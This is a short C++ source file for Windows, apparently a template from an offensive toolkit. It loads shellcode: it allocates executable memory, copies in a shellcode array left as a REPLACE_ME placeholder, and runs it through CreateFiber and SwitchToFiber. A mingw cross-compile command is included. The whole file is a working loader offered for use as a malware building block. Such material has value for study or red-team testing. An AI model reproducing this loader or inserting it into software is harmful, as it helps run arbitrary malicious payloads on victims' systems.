#include <windows.h>
/*
x86_64-w64-mingw32-g++ create_fiber.cpp -lkernel32 -o file.exe
*/
int main()
{
	PVOID mainFiber = ConvertThreadToFiber(NULL);
	unsigned char shellcode[] = {REPLACE_ME};

	PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(shellcodeLocation, shellcode, sizeof shellcode);

	PVOID shellcodeFiber = CreateFiber((SIZE_T)0, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);
	SwitchToFiber(shellcodeFiber);
	return 0;
}
